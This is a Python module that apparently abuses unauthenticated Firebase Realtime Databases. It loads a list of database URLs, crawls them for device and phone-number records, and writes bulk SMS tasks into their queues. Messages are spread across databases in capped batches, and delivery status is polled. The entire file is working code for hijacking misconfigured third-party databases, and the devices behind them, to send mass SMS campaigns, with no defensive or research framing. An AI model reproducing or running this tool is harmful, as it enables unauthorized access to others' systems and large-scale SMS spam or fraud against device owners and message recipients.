"""
Firebase Realtime Database REST client (no auth — rules: true).
Handles device discovery, SMS task writing, and stat polling.
"""

import asyncio
import uuid
import time
import aiohttp
from dataclasses import dataclass
from typing import Optional
import pathlib as _pl


def _load_urls() -> list[str]:
    p = _pl.Path(__file__).parent / "databases.txt"
    if not p.exists():
        return []
    return [ln.strip() for ln in p.read_text().splitlines() if ln.strip() and not ln.startswith("#")]

RTDB_URLS: list[str] = _load_urls()

DEVICE_PATHS    = ["devices", "Devices", "device", "Device", "users", "Users"]
SMS_QUEUE_PATH  = "sms_tasks"
MAX_SMS_PER_DB  = 60
CONCURRENT_WRITE = 40
POLL_INTERVAL   = 8
POLL_TIMEOUT    = 180


@dataclass
class RtdbDevice:
    db_url: str
    device_id: str
    label: str = ""
    phone_number: str = ""
    status: str = "online"


@dataclass
class CampaignStats:
    total: int = 0
    sent: int = 0
    failed: int = 0
    pending: int = 0
    db_url: str = ""


async def _get(session: aiohttp.ClientSession, url: str) -> Optional[dict]:
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
            if r.status == 200:
                return await r.json(content_type=None)
    except Exception:
        pass
    return None


async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
    try:
        async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=8)) as r:
            return r.status in (200, 201)
    except Exception:
        return False


async def _discover_devices_one(session: aiohttp.ClientSession, db_url: str) -> list[RtdbDevice]:
    top = await _get(session, f"{db_url}/.json?shallow=true")
    if not top or not isinstance(top, dict):
        return []

    for path in DEVICE_PATHS:
        if path.lower() not in [k.lower() for k in top.keys()]:
            continue
        data = await _get(session, f"{db_url}/{path}.json?shallow=true")
        if not data or not isinstance(data, dict):
            continue
        devices = []
        for dev_id in data:
            record = await _get(session, f"{db_url}/{path}/{dev_id}.json")
            if not record or not isinstance(record, dict):
                continue
            status = str(record.get("status", record.get("Status", "online"))).lower()
            if status in ("offline", "inactive", "disconnected"):
                continue
            devices.append(RtdbDevice(
                db_url=db_url,
                device_id=dev_id,
                label=str(record.get("name", record.get("deviceName", record.get("model", dev_id))))[:30],
                phone_number=str(record.get("phoneNumber", record.get("phone_number", ""))),
                status=status,
            ))
        if devices:
            return devices

    return [RtdbDevice(db_url=db_url, device_id="default", label=db_url.split("//")[1].split(".")[0])]


async def discover_all_devices() -> list[RtdbDevice]:
    async with aiohttp.ClientSession() as session:
        tasks = [_discover_devices_one(session, url) for url in RTDB_URLS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    devices = []
    for r in results:
        if isinstance(r, list):
            devices.extend(r)
    return devices


async def _write_sms_task(session, db_url, task_id, phone, text, campaign_id) -> bool:
    payload = {
        "to":         phone,
        "message":    text,
        "campaignId": campaign_id,
        "status":     "pending",
        "createdAt":  int(time.time() * 1000),
    }
    return await _put(session, f"{db_url}/{SMS_QUEUE_PATH}/{task_id}.json", payload)


async def dispatch_campaign(devices, numbers, text, progress_cb=None) -> tuple[str, dict]:
    campaign_id = str(uuid.uuid4())[:12]
    db_urls     = list({d.db_url for d in devices})
    db_counts   = {u: 0 for u in db_urls}
    assignments = []

    for i, phone in enumerate(numbers):
        for attempt in range(len(db_urls)):
            url = db_urls[(i + attempt) % len(db_urls)]
            if db_counts[url] < MAX_SMS_PER_DB:
                assignments.append((url, f"{campaign_id}_{str(uuid.uuid4())[:8]}", phone))
                db_counts[url] += 1
                break

    total       = len(assignments)
    db_task_map = {u: [] for u in db_urls}
    sent = failed = 0
    sem  = asyncio.Semaphore(CONCURRENT_WRITE)

    async def _write_one(db_url, task_id, phone):
        nonlocal sent, failed
        async with sem:
            async with aiohttp.ClientSession() as s:
                ok = await _write_sms_task(s, db_url, task_id, phone, text, campaign_id)
        if ok:
            sent += 1
            db_task_map[db_url].append(task_id)
        else:
            failed += 1
        if progress_cb and ((sent + failed) % 50 == 0 or (sent + failed) == total):
            await progress_cb(sent, total, failed)

    await asyncio.gather(*[_write_one(u, t, p) for u, t, p in assignments])
    return campaign_id, db_task_map


async def poll_stats(db_task_map, campaign_id, update_cb=None):
    deadline = time.time() + POLL_TIMEOUT
    total    = sum(len(v) for v in db_task_map.values())

    while time.time() < deadline:
        await asyncio.sleep(POLL_INTERVAL)
        grand = CampaignStats(total=total)
        stats_list = []

        async with aiohttp.ClientSession() as session:
            for db_url, task_ids in db_task_map.items():
                if not task_ids:
                    continue
                s = CampaignStats(total=len(task_ids), db_url=db_url)
                for tid in task_ids:
                    rec = await _get(session, f"{db_url}/{SMS_QUEUE_PATH}/{tid}.json")
                    if not rec:
                        s.pending += 1
                        continue
                    st = str(rec.get("status", "pending")).lower()
                    if st in ("sent", "delivered", "success"):
                        s.sent += 1
                    elif st in ("failed", "error"):
                        s.failed += 1
                    else:
                        s.pending += 1
                stats_list.append(s)
                grand.sent    += s.sent
                grand.failed  += s.failed
                grand.pending += s.pending

        if update_cb:
            await update_cb(grand, stats_list)
        if grand.pending == 0:
            break
